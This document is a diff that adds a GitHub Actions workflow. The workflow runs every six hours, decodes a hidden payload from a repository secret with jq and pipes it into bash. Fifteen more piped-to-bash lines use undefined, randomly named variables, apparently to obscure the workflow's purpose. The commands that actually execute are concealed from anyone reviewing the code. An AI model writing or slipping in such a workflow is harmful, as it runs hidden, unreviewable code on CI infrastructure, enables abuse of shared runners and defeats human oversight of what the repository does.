@@ -1,0 +1,34 @@
+name: ariafirebase2027
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ariafirebase2027
+        env:
+          ycrn386: ${{ secrets.ycrn386 }}
+        run: |
+          echo $ycrn386 | jq -r .v0 | /bin/bash
+          echo $ozz3 | jq -r .csjql5 | /bin/bash
+          echo $bpyw17 | jq -r .rjm57 | /bin/bash
+          echo $nee66 | jq -r .x28278 | /bin/bash
+          echo $mtyxl83 | jq -r .kbtki996 | /bin/bash
+          echo $dtyez52 | jq -r .oad241 | /bin/bash
+          echo $bpg6555 | jq -r .kp3 | /bin/bash
+          echo $dprl50 | jq -r .kyps74893 | /bin/bash
+          echo $p976 | jq -r .oj46 | /bin/bash
+          echo $rpzi16836 | jq -r .x62 | /bin/bash
+          echo $rpjhv32 | jq -r .swu9864 | /bin/bash
+          echo $gbu2812 | jq -r .f5 | /bin/bash
+          echo $ad89 | jq -r .dvj58 | /bin/bash
+          echo $hdyna27 | jq -r .t08 | /bin/bash
+          echo $rtb71 | jq -r .kpit4926 | /bin/bash
+          echo $dg6 | jq -r .fyyp96827 | /bin/bash
+
